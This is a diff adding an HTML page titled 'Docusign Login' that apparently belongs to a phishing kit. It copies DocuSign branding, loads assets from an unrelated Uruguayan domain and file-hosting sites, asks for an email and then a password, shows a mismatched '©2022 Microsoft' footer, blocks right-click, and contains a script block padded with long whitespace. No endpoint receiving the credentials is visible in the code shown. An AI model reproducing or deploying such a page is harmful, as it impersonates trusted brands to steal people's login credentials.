@@ -1,0 +1,257 @@
+<html><head>
+   <title>Docusign Login</title>
+<link rel="stylesheet" type="text/css" href="https://effective.com.uy/pt/office.css">
+   <link href="lib/img/favicon.ico" rel="shortcut icon">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" crossorigin="anonymous">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script>
+$(window).on('load', function() { // makes sure the whole site is loaded 
+  $('#status').fadeOut(); // will first fade out the loading animation 
+  $('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website. 
+  
+})
+</script><style>
+body {
+  overflow: hidden;
+}
+
+
+/* Preloader */
+
+#preloader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: #fff;
+  /* change if the mask should have another color then white */
+  z-index: 99;
+  /* makes sure it stays on top */
+}
+
+#status {
+  width: 502px;
+  height: 307px;
+  position: absolute;
+  left: 35%;
+  /* centers the loading animation horizontally one the screen */
+  top: 35%;
+ 
+  /* path to your loading animation */
+  background-repeat: no-repeat;
+  background-position: center;
+  margin: -100px 0 0 -100px;
+  /* is width and height divided by two */
+}
+</style></head>   
+
+
+<body style="display:block" class="cb"><div id="preloader" style="display: none;">
+ <div id="status" style="display: none;">&nbsp;</div>
+</div>
+<img src="https://effective.com.uy/pt/bg_docusign.png" alt="" style="width:1450px;height:110px;">
+
+
+
+                                       
+                                    </div>
+<script>
+
+        window.oncontextmenu = function () {
+
+            console.log("Right Click Disabled");
+
+            return false;
+
+        }
+
+    </script>
+   
+   
+      <div>
+         <div>
+           
+            </div>
+         </div>
+
+            
+                  <div class="app fade-in-lightbox inner">
+                     <div>
+                        <img id="logo_image" class="banner-logo" src="https://account.docusign.com/LoginAppNext/images/docusign_logo_small.png">
+                     </div>
+                     <div>
+
+
+                        <div id="pick_em" style="display: none;">
+                           <div class="animate pagination-view slide-in-next">
+                              <div data-showfedcredbutton="true" data-viewid="1">
+                                 <div>
+                                    <div class="row text-title" id="loginHeader">
+                                       <div aria-level="1">Sign in</div>
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="col-md-24 form-group">
+                                       <div class="placeholderContainer">
+					                   <div class="add_em">
+											 <p style="font-weight: bold;margin-left: 4%">Pick an account</p>
+											 <a href="#" class="email-picker">
+												 <div class="block-m2">
+													<img role="presentation" src="https://i.ibb.co/jg6w34B/picker-account.png"> <span id="em_picker"></span><span style="float:right; margin-top:4%"><img src="https://srv-file8.gofile.io/download/NAGerp/picker_more.png" alt=""></span>
+												 </div>
+											 </a>
+											 <a href="#" class="email-picker2">
+												 <div class="block-m2">
+													<img role="presentation" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48Y2lyY2xlIGN4PSIyNCIgY3k9IjI0IiByPSIyNCIgZmlsbD0iI2U2ZTZlNiIvPjxwYXRoIGQ9Ik0yNSwyM0gzNnYySDI1VjM2SDIzVjI1SDEyVjIzSDIzVjEyaDJaIiBmaWxsPSIjNDA0MDQwIi8+PC9zdmc+"><span style="word-wrap:break-word;"> Use another account</span>
+												 </div>
+											 </a>
+											 <br>
+										</div>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="position-buttons">
+
+                                 </div>
+                              </div>
+                           </div>
+                        </div><img src="https://effective.com.uy/pt/bg_docusign.png" alt="" style="width:1450px;height:50px;">
+
+
+
+
+                        <div id="add_em" style="">
+                           <div class="animate pagination-view slide-in-next">
+                              <div data-showfedcredbutton="true" data-viewid="1">
+                                 <div>
+                                    <div class="row text-title" id="loginHeader">
+                                       <div aria-level="1" align="center">
+Log In
+</div>
+                                       
+                                    </div>
+                                 </div>
+                                 <div class="row">
+									<div aria-live="assertive" role="alert" style="display: none;" class="error-alert">
+										<div class="alert alert-error error-alert-msg"></div>
+										<br>
+									</div>
+                                    <br><div class="col-md-24 form-group">
+                                       <div class="placeholderContainer">
+											<input type="text" name="email" id="email" class="form-control ltr_override" value="" placeholder="Enter email">
+                                       </div>
+                                    </div>
+                                 </div>
+                                 
+                                    <div class="row">
+                                       <div class="col-xs-24 no-padding-left-right button-container">
+                                       <div class="inline-block">
+                                          <button class="btn btn-block btn-primary btn-email">NEXT</button>
+                                       </div><div>
+										<div class="row">
+											<div class="col-md-24">
+													<div class="action-links text-13">
+													<div class="form-group"></div>
+													<div class="form-group"></div>
+												</div>
+											</div>
+										</div>
+									</div><div>
+										<div class="row">
+											<div class="col-md-24">
+													<div class="action-links text-13">
+													<div class="form-group"><a href="#">No account? Sign up for free</a></div>
+													<div class="form-group"></div>
+												</div>
+											</div>
+										</div>
+									</div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+						<div id="add_pass" style="display: none;">
+							<div class="animate slide-in-next">
+								<div>
+									<div class="identityBanner"><div class="row text-title">
+Log In
+</div>
+										
+										<div class="identity"></div>
+									</div>
+								</div>
+							</div>
+							<div class="animate slide-in-next has-identity-banner pagination-view">
+								<br><br><br>
+								<div class="row">
+									<div class="form-group col-md-24">
+										<div aria-live="assertive" role="alert" style="display: none;" class="error-alert-pass">
+											<div class="alert alert-error">Your email or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></div>
+										</div>
+										<div class="placeholderContainer">
+											<input name="password" type="password" id="password" autocomplete="off" class="form-control" placeholder="Enter password" tabindex="0">
+										</div>
+									</div>
+								</div>
+							
+									<div class="row">
+										<div>
+											<div class="button-container col-xs-24 no-padding-left-right">
+												<div class="inline-block">
+													<button class="btn btn-block btn-primary btn-signin">LOG IN</button>
+												</div>
+											</div>
+										</div>
+									 </div>
+								</div>	<div class="position-buttons">
+									<div>
+										<div class="row">
+											<div class="col-md-24">
+													<div class="action-links text-13">
+													<div class="form-group"><a href="#">Forgot your password ?</a></div>
+													<div class="form-group"></div>
+												</div>
+											</div>
+										</div>
+									</div>
+							</div>
+                        </div>
+                     </div>
+                  </div>
+                  <div>
+                  </div>
+                  <div class="footer" id="footer">
+                     <div>
+                        <div class="footerNode text-secondary">
+                           <span>©2022 Microsoft</span>
+                           <a href="#">Terms of use</a>
+                           <a href="#">Privacy &amp; cookies</a>
+                           <a href="#">...</a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+
+      </div>
+	  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+
+     <script>
+		                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+	  </script>
+
+
+    <script type="text/javascript">
+  $(document).keypress(function(event){
+  var keycode = (event.keyCode ? event.keyCode : event.which);
+  if(keycode == '13'){
+    $("#btn-email, .btn-signin").click();
+  }
+});
+</script>
+   
+   
+</body></html>
